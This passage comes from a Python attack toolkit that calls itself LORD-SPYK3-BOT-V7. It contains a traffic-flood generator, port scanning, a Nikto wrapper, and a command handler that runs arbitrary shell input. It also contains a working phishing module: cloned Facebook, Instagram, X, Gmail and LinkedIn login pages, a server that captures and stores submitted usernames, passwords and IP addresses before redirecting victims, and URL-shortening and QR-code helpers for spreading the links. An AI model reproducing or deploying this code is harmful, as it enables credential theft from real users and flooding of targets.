        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def stop(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
            return False
        else:
            for event in self.stop_events.values():
                event.set()
            return True
    
    def get_active(self) -> List[Dict]:
        """Get active generators"""
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# IP ANALYSIS ENGINE
# =====================
class IPAnalysisEngine:
    """Complete IP analysis engine"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def analyze(self, target: str) -> IPAnalysisResult:
        """Perform complete IP analysis"""
        try:
            # Validate IP
            try:
                ipaddress.ip_address(target)
            except ValueError:
                try:
                    target = socket.gethostbyname(target)
                except:
                    return self._error_result(target, "Invalid IP or hostname")
            
            # Ping
            ping_result = self._ping(target)
            
            # Port scan
            port_result = self._scan_ports(target)
            
            # Geolocation
            geo_result = self._geolocation(target)
            
            # Security status
            security_status = self._assess_security(target, port_result)
            
            # Recommendations
            recommendations = self._generate_recommendations(ping_result, port_result, security_status)
            
            result = IPAnalysisResult(
                target_ip=target,
                timestamp=datetime.datetime.now().isoformat(),
                ping_result=ping_result,
                port_scan_result=port_result,
                geolocation_result=geo_result,
                security_status=security_status,
                recommendations=recommendations,
                success=True
            )
            
            # Save to database
            self.db.conn.execute(
                "INSERT INTO ip_analysis (target_ip, analysis_result, success) VALUES (?, ?, ?)",
                (target, json.dumps(asdict(result)), 1)
            )
            self.db.conn.commit()
            
            return result
            
        except Exception as e:
            return self._error_result(target, str(e))
    
    def _ping(self, target: str) -> Dict:
        """Ping target"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', '4', target]
            else:
                cmd = ['ping', '-c', '4', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            output = result.stdout + result.stderr
            
            # Parse RTT
            avg_rtt = None
            if platform.system().lower() == 'windows':
                match = re.search(r'Average = (\d+)ms', output)
            else:
                match = re.search(r'rtt min/avg/max/mdev = [\d.]+/([\d.]+)/', output)
            if match:
                avg_rtt = float(match.group(1))
            
            # Parse packet loss
            loss_match = re.search(r'(\d+)% packet loss', output)
            packet_loss = int(loss_match.group(1)) if loss_match else 0
            
            return {
                'success': result.returncode == 0,
                'output': output[:500],
                'avg_rtt': avg_rtt,
                'packet_loss': packet_loss
            }
        except Exception as e:
            return {'success': False, 'output': str(e), 'avg_rtt': None, 'packet_loss': 100}
    
    def _scan_ports(self, target: str) -> Dict:
        """Scan common ports"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
                        445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        open_ports = []
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((target, port)) == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    open_ports.append({
                        'port': port,
                        'protocol': 'tcp',
                        'service': service,
                        'state': 'open'
                    })
                sock.close()
            except:
                pass
        
        return {
            'success': True,
            'open_ports': open_ports,
            'count': len(open_ports)
        }
    
    def _geolocation(self, target: str) -> Dict:
        """Get geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{target}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('isp', 'Unknown'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    def _assess_security(self, target: str, port_result: Dict) -> Dict:
        """Assess security status"""
        open_ports = port_result.get('open_ports', [])
        sensitive_ports = [21, 22, 23, 3389, 5900]
        
        risk_score = len(open_ports) * 5
        
        for port_info in open_ports:
            if port_info.get('port') in sensitive_ports:
                risk_score += 10
        
        if risk_score >= 70:
            risk_level = "critical"
        elif risk_score >= 40:
            risk_level = "high"
        elif risk_score >= 20:
            risk_level = "medium"
        else:
            risk_level = "low"
        
        # Check if IP is blocked
        managed = self.db.conn.execute(
            "SELECT is_blocked FROM managed_ips WHERE ip_address = ?", (target,)
        ).fetchone()
        is_blocked = managed and managed['is_blocked']
        
        return {
            'risk_score': risk_score,
            'risk_level': risk_level,
            'open_ports_count': len(open_ports),
            'sensitive_ports': [p['port'] for p in open_ports if p['port'] in sensitive_ports],
            'is_blocked': is_blocked
        }
    
    def _generate_recommendations(self, ping: Dict, port_result: Dict, security: Dict) -> List[str]:
        """Generate recommendations"""
        recommendations = []
        
        if not ping.get('success'):
            recommendations.append("Target is not responding to ping - may be down or blocking ICMP")
        
        if ping.get('packet_loss', 0) > 20:
            recommendations.append(f"High packet loss ({ping.get('packet_loss', 0)}%) - network instability detected")
        
        open_ports = port_result.get('open_ports', [])
        if len(open_ports) > 10:
            recommendations.append("Multiple open ports detected - consider closing unnecessary ports")
        
        for port_info in open_ports:
            port = port_info.get('port')
            if port in [23, 3389]:
                recommendations.append(f"Port {port} (telnet/RDP) is open - consider using SSH/VPN instead")
            elif port == 21:
                recommendations.append(f"Port 21 (FTP) is open - consider using SFTP/FTPS")
        
        if security.get('risk_level') in ['critical', 'high']:
            recommendations.append("Consider blocking this IP address due to high risk")
        
        if not recommendations:
            recommendations.append("No immediate security concerns detected")
        
        return recommendations
    
    def _error_result(self, target: str, error: str) -> IPAnalysisResult:
        """Create error result"""
        return IPAnalysisResult(
            target_ip=target,
            timestamp=datetime.datetime.now().isoformat(),
            ping_result={'success': False, 'output': error},
            port_scan_result={'success': False, 'open_ports': []},
            geolocation_result={'success': False},
            security_status={'risk_level': 'unknown'},
            recommendations=["Analysis failed due to error"],
            success=False,
            error=error
        )

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        """Check if Nikto is available"""
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> NiktoResult:
        """Run Nikto scan"""
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=0,
                output_file="",
                success=False,
                error="Nikto not installed"
            )
        
        try:
            timestamp = int(time.time())
            output_file = f"nikto_{target.replace('/', '_')}_{timestamp}.json"
            output_path = os.path.join("nikto_results", output_file)
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_path]
            
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            # Parse vulnerabilities
            vulnerabilities = []
            if os.path.exists(output_path):
                try:
                    with open(output_path, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            nikto_result = NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=vulnerabilities,
                scan_time=scan_time,
                output_file=output_path,
                success=result.returncode == 0
            )
            
            # Save to database
            self.db.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_path, scan_time, result.returncode == 0)
            )
            self.db.conn.commit()
            
            return nikto_result
            
        except subprocess.TimeoutExpired:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error="Scan timed out"
            )
        except Exception as e:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error=str(e)
            )

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.phishing_server = None
        self.active_links: Dict[str, Dict] = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict:
        """Generate phishing link"""
        link_id = str(uuid.uuid4())[:8]
        
        # Get template
        templates = {
            'facebook': self._facebook_template(),
            'instagram': self._instagram_template(),
            'twitter': self._twitter_template(),
            'gmail': self._gmail_template(),
            'linkedin': self._linkedin_template()
        }
        
        html = templates.get(platform, self._custom_template())
        
        phishing_url = f"http://localhost:{self.config.get('social_engineering.default_port', 8080)}/{link_id}"
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=phishing_url,
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        # Save to database
        self.db.conn.execute(
            "INSERT INTO phishing_links (id, platform, phishing_url, template) VALUES (?, ?, ?, ?)",
            (link_id, platform, phishing_url, platform)
        )
        self.db.conn.commit()
        
        # Store active link
        self.active_links[link_id] = {
            'platform': platform,
            'html': html,
            'url': phishing_url
        }
        
        return {
            'success': True,
            'link_id': link_id,
            'platform': platform,
            'phishing_url': phishing_url
        }
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server"""
        if link_id not in self.active_links:
            return False
        
        link = self.active_links[link_id]
        
        class PhishingHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(link['html'].encode())
                
                # Update click count
                self.server.db.update_phishing_clicks(link_id)
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                
                # Parse credentials
                data = urllib.parse.parse_qs(post_data)
                username = data.get('email', data.get('username', ['']))[0]
                password = data.get('password', [''])[0]
                
                # Save credentials
                if username and password:
                    self.server.db.save_credentials(
                        link_id, username, password,
                        self.client_address[0],
                        self.headers.get('User-Agent', 'Unknown')
                    )
                    print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {self.client_address[0]}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                # Redirect to real site
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        try:
            server = HTTPServer(('0.0.0.0', port), PhishingHandler)
            server.db = self.db
            server.link_id = link_id
            server.phishing_url = link['url']
            
            self.phishing_server = server
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            return True
        except Exception as e:
            print(f"Failed to start server: {e}")
            return False
    
    def stop_server(self):
        """Stop phishing server"""
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        if link_id:
            rows = self.db.conn.execute(
                "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                (link_id,)
            )
        else:
            rows = self.db.conn.execute(
                "SELECT * FROM captured_credentials ORDER BY timestamp DESC"
            )
        return [dict(row) for row in rows]
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten phishing URL"""
        if not SHORTENER_AVAILABLE:
            return None
        
        try:
            link = self.db.conn.execute(
                "SELECT phishing_url FROM phishing_links WHERE id = ?", (link_id,)
            ).fetchone()
            if link:
                s = pyshorteners.Shortener()
                return s.tinyurl.short(link['phishing_url'])
        except:
            pass
        return None
    
    def generate_qr(self, link_id: str) -> Optional[str]:
        """Generate QR code"""
        if not QRCODE_AVAILABLE:
            return None
        
        try:
            link = self.db.conn.execute(
                "SELECT phishing_url FROM phishing_links WHERE id = ?", (link_id,)
            ).fetchone()
            if link:
                qr = qrcode.QRCode(box_size=10, border=5)
                qr.add_data(link['phishing_url'])
                qr.make()
                img = qr.make_image(fill_color="black", back_color="white")
                path = f"qr_{link_id}.png"
                img.save(path)
                return path
        except:
            pass
        return None
    
    def _facebook_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
.logo{text-align:center;margin-bottom:20px}
.logo h1{color:#1877f2;font-size:40px;margin:0}
input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:15px;box-sizing:border-box}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border:1px solid #ffeeba;border-radius:4px;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>facebook</h1></div>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _instagram_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Instagram • Login</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 30px;width:350px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{font-family:'Billabong',cursive;font-size:50px;color:#262626}
input{width:100%;padding:9px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin-bottom:10px;box-sizing:border-box}
button{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border:1px solid #ffeeba;border-radius:4px;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Instagram</h1></div>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _twitter_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>X / Twitter</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea}
.login-box{background:#000;border:1px solid #2f3336;border-radius:16px;padding:48px;width:400px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{font-size:40px;margin:0}
input{width:100%;padding:12px;background:#000;border:1px solid #2f3336;border-radius:4px;color:#e7e9ea;margin-bottom:20px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1d9bf0;color:#fff;border:none;border-radius:9999px;font-weight:bold;cursor:pointer}
.warning{margin-top:20px;padding:12px;background:#1a1a1a;border:1px solid #2f3336;border-radius:8px;color:#e7e9ea;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>𝕏</h1><h2>Sign in to X</h2></div>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Phone, email, or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _gmail_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Gmail</title>
<style>
body{font-family:'Google Sans',Roboto;background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:28px;padding:48px 40px;width:400px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#1a73e8;font-size:24px}
h2{font-size:24px;font-weight:400;margin:0}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;margin-bottom:20px;box-sizing:border-box}
button{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-weight:500;cursor:pointer}
.warning{margin-top:30px;padding:12px;background:#e8f0fe;border:1px solid #d2e3fc;border-radius:8px;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Gmail</h1></div>
<h2>Sign in</h2>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Next</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _linkedin_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>LinkedIn Login</title>
<style>
body{font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto;background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;padding:40px 32px;width:400px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
.logo{text-align:center;margin-bottom:24px}
.logo h1{color:#0a66c2;font-size:32px}
h2{font-size:24px;font-weight:600;margin:0}
input{width:100%;padding:14px;border:1px solid #666;border-radius:4px;margin-bottom:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:28px;font-weight:600;cursor:pointer}
.warning{margin-top:24px;padding:12px;background:#fff3cd;border:1px solid #ffeeba;border-radius:4px;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>LinkedIn</h1></div>
<h2>Sign in</h2>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _custom_template(self) -> str:
        return """<!DOCTYPE html>
<html>
<head><title>Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:10px;padding:40px;width:400px;box-shadow:0 10px 25px rgba(0,0,0,0.1)}
.logo{text-align:center;margin-bottom:30px}
.logo h1{color:#6b46c1;font-size:28px}
input{width:100%;padding:12px 15px;border:1px solid #ddd;border-radius:5px;margin-bottom:20px;box-sizing:border-box}
button{width:100%;padding:12px;background:linear-gradient(135deg,#9f7aea 0%,#6b46c1 100%);color:#fff;border:none;border-radius:5px;font-weight:600;cursor:pointer}
.warning{margin-top:20px;padding:10px;background:#fff3cd;border:1px solid #ffeeba;border-radius:5px;color:#856404;text-align:center}
</style>
</head>
<body>
<div class="login-box">
<div class="logo"><h1>Login</h1></div>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# REPORT GENERATOR
# =====================
class ReportGenerator:
    """Generate reports with graphics"""
    
    def __init__(self, output_dir: str = "reports"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    def generate_html(self, analysis: IPAnalysisResult) -> str:
        """Generate HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = self.output_dir / f"analysis_{analysis.target_ip}_{timestamp}.html"
        
        risk_level = analysis.security_status.get('risk_level', 'unknown')
        risk_colors = {
            'critical': '#dc3545', 'high': '#fd7e14',
            'medium': '#ffc107', 'low': '#28a745'
        }
        risk_color = risk_colors.get(risk_level, '#6c757d')
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SPYK3 Analysis - {analysis.target_ip}</title>
    <style>
        body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;line-height:1.6;color:#333;max-width:1200px;margin:0 auto;padding:20px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);}}
        .header{{background:linear-gradient(135deg,#9f7aea 0%,#6b46c1 100%);color:white;padding:30px;border-radius:10px;margin-bottom:30px;text-align:center;}}
        .section{{background:white;padding:25px;border-radius:10px;margin-bottom:25px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}}
        .risk-badge{{display:inline-block;padding:8px 16px;border-radius:20px;font-weight:bold;color:white;background-color:{risk_color};}}
        table{{width:100%;border-collapse:collapse;margin-top:20px;}}
        th,td{{padding:12px;text-align:left;border-bottom:1px solid #dee2e6;}}
        th{{background-color:#9f7aea;color:white;}}
        .recommendation{{background:#e7f5ff;padding:15px;border-radius:8px;margin:10px 0;border-left:4px solid #9f7aea;}}
    </style>
</head>
<body>
    <div class="header">
        <h1>SPYK3 IP Analysis Report</h1>
        <p>Target: {analysis.target_ip} | Time: {analysis.timestamp[:19]}</p>
        <div><span class="risk-badge">Risk Level: {risk_level.upper()}</span></div>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>Risk Score: <strong>{analysis.security_status.get('risk_score', 0)}</strong></p>
        <p>Open Ports: <strong>{analysis.port_scan_result.get('count', 0)}</strong></p>
        <p>Location: <strong>{analysis.geolocation_result.get('city', 'Unknown')}, {analysis.geolocation_result.get('country', 'Unknown')}</strong></p>
    </div>
    
    <div class="section">
        <h2>Open Ports</h2>
        <table>
            <tr><th>Port</th><th>Service</th><th>State</th></tr>
            {''.join(f'<tr><td>{p["port"]}</td><td>{p.get("service", "unknown")}</td><td>open</td></tr>' for p in analysis.port_scan_result.get('open_ports', [])[:20])}
        </table>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        {''.join(f'<div class="recommendation">• {rec}</div>' for rec in analysis.recommendations)}
    </div>
    
    <div class="section">
        <h2>Geolocation Details</h2>
        <table>
            <tr><th>Country</th><td>{analysis.geolocation_result.get('country', 'Unknown')}</td></tr>
            <tr><th>City</th><td>{analysis.geolocation_result.get('city', 'Unknown')}</td></tr>
            <tr><th>ISP</th><td>{analysis.geolocation_result.get('isp', 'Unknown')}</td></tr>
        </table>
    </div>
    
    <div class="section">
        <h2>Ping Results</h2>
        <table>
            <tr><th>Status</th><td>{'Online' if analysis.ping_result.get('success') else 'Offline'}</td></tr>
            <tr><th>Avg RTT</th><td>{analysis.ping_result.get('avg_rtt', 'N/A')}ms</td></tr>
            <tr><th>Packet Loss</th><td>{analysis.ping_result.get('packet_loss', 0)}%</td></tr>
        </table>
    </div>
    
    <div class="section">
        <h2>Security Assessment</h2>
        <table>
            <tr><th>Risk Score</th><td>{analysis.security_status.get('risk_score', 0)}</td></tr>
            <tr><th>Risk Level</th><td>{analysis.security_status.get('risk_level', 'unknown').upper()}</td></tr>
            <tr><th>Blocked Status</th><td>{'Blocked' if analysis.security_status.get('is_blocked') else 'Not Blocked'}</td></tr>
        </table>
    </div>
    
    <div style="text-align:center;margin-top:40px;padding:20px;color:white;">
        <p>Report generated by LORD-SPYK3-BOT-V7 | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
</body>
</html>"""
        
        with open(filename, 'w') as f:
            f.write(html)
        
        return str(filename)
    
    def generate_pdf(self, analysis: IPAnalysisResult) -> str:
        """Generate PDF report"""
        if not PDF_AVAILABLE:
            return ""
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = self.output_dir / f"analysis_{analysis.target_ip}_{timestamp}.pdf"
        
        doc = SimpleDocTemplate(str(filename), pagesize=A4)
        styles = getSampleStyleSheet()
        title_style = ParagraphStyle('Title', parent=styles['Heading1'], fontSize=24, alignment=TA_CENTER)
        heading_style = ParagraphStyle('Heading', parent=styles['Heading2'], fontSize=16, textColor=colors.HexColor('#6b46c1'))
        
        story = []
        story.append(Paragraph(f"SPYK3 IP Analysis Report", title_style))
        story.append(Paragraph(f"Target: {analysis.target_ip}", heading_style))
        story.append(Spacer(1, 20))
        
        story.append(Paragraph("Executive Summary", heading_style))
        story.append(Paragraph(f"Risk Score: {analysis.security_status.get('risk_score', 0)}", styles['Normal']))
        story.append(Paragraph(f"Open Ports: {analysis.port_scan_result.get('count', 0)}", styles['Normal']))
        story.append(Spacer(1, 15))
        
        story.append(Paragraph("Open Ports", heading_style))
        ports_data = [['Port', 'Service']]
        for p in analysis.port_scan_result.get('open_ports', [])[:20]:
            ports_data.append([str(p['port']), p.get('service', 'unknown')])
        if len(ports_data) > 1:
            table = Table(ports_data)
            table.setStyle(TableStyle([('BACKGROUND', (0,0), (-1,0), colors.grey), ('GRID', (0,0), (-1,-1), 1, colors.black)]))
            story.append(table)
        story.append(Spacer(1, 15))
        
        story.append(Paragraph("Recommendations", heading_style))
        for rec in analysis.recommendations:
            story.append(Paragraph(f"• {rec}", styles['Normal']))
        
        doc.build(story)
        return str(filename)

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Unified command handler"""
    
    def __init__(self, db: DatabaseManager, ssh: SSHManager, traffic: TrafficGeneratorEngine,
                 ip_engine: IPAnalysisEngine, nikto: NiktoScanner, social: SocialEngineeringTools,
                 report_gen: ReportGenerator, config: ConfigManager):
        self.db = db
        self.ssh = ssh
        self.traffic = traffic
        self.ip_engine = ip_engine
        self.nikto = nikto
        self.social = social
        self.report_gen = report_gen
        self.config = config
        
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, callable]:
        """Build command registry"""
        return {
            # IP Analysis
            'analyze': self._analyze,
            'ipinfo': self._ipinfo,
            
            # SSH
            'ssh': self._ssh_list,
            'ssh_add': self._ssh_add,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # Traffic
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # Nikto
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            
            # Phishing
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            
            # System
            'status': self._status,
            'history': self._history,
            'help': self._help,
            'clear': self._clear
        }
    
    def execute(self, command: str, source: str = "local") -> CommandResult:
        """Execute a command"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return CommandResult(False, "Empty command", 0)
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        if cmd in self.commands:
            try:
                result = self.commands[cmd](args)
                execution_time = time.time() - start_time
                self.db.log_command(command, source, result.success, result.output, execution_time)
                result.execution_time = execution_time
                return result
            except Exception as e:
                execution_time = time.time() - start_time
                self.db.log_command(command, source, False, str(e), execution_time)
                return CommandResult(False, f"Error: {e}", execution_time)
        else:
            # Try as generic command
            return self._generic(command, start_time, source)
    
    def _generic(self, command: str, start_time: float, source: str) -> CommandResult:
        """Execute generic shell command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            output = result.stdout if result.stdout else result.stderr
            success = result.returncode == 0
            self.db.log_command(command, source, success, output[:5000], execution_time)
            return CommandResult(success, output, execution_time)
        except subprocess.TimeoutExpired:
            return CommandResult(False, "Command timed out", time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time)
    
    # ==================== Command Implementations ====================
    
    def _analyze(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: analyze <ip>", 0)
        
        result = self.ip_engine.analyze(args[0])
        
        if result.success:
            output = f"Analysis Results for {result.target_ip}:\n"
            output += f"  Risk Level: {result.security_status.get('risk_level', 'unknown').upper()}\n"
            output += f"  Risk Score: {result.security_status.get('risk_score', 0)}\n"
            output += f"  Open Ports: {result.port_scan_result.get('count', 0)}\n"
            output += f"  Location: {result.geolocation_result.get('city', 'Unknown')}, {result.geolocation_result.get('country', 'Unknown')}\n"
            output += f"  Recommendations:\n"
            for rec in result.recommendations[:3]:
                output += f"    • {rec}\n"
            
            # Generate report
            html_report = self.report_gen.generate_html(result)
            output += f"\nReport saved: {html_report}"
            
            return CommandResult(True, output, 0)
        else:
            return CommandResult(False, f"Analysis failed: {result.error}", 0)
    
    def _ipinfo(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: ipinfo <ip>", 0)
        
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
        except:
            return CommandResult(False, f"Invalid IP: {ip}", 0)
        
        # Get location
        try:
            resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('status') == 'success':
                    output = f"IP: {ip}\n"
                    output += f"Country: {data.get('country', 'Unknown')}\n"
                    output += f"Region: {data.get('regionName', 'Unknown')}\n"
                    output += f"City: {data.get('city', 'Unknown')}\n"
                    output += f"ISP: {data.get('isp', 'Unknown')}\n"
                    return CommandResult(True, output, 0)
        except:
            pass
        
        return CommandResult(False, f"Could not get info for {ip}", 0)
    
    def _ssh_list(self, args: List[str]) -> CommandResult:
